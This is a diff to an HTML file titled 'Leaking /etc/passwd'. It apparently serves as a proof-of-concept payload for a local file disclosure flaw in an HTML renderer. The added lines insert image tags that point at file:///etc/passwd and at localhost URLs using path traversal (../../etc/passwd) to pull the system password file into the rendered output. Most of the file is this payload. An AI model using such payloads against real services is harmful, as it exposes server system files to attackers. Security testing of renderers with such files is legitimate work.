@@ -5,6 +5,10 @@
 </head>
 <body>
     <h1>Leaking /etc/passwd</h1>
-    <img src="file:///etc/passwd" alt="Leaked /etc/passwd">
+    <img src="file:///etc/passwd" height="600" width="600" alt="Leaked /etc/passwd">
+
+    <img src="http://localhost/../../etc/passwd"  height="600" width="600" >
+    <img src="http://localhost/../../../etc/passwd"  height="600" width="600" >
+    <img src="http://localhost/../../../../etc/passwd"  height="600" width="600" >
 </body>
 </html>
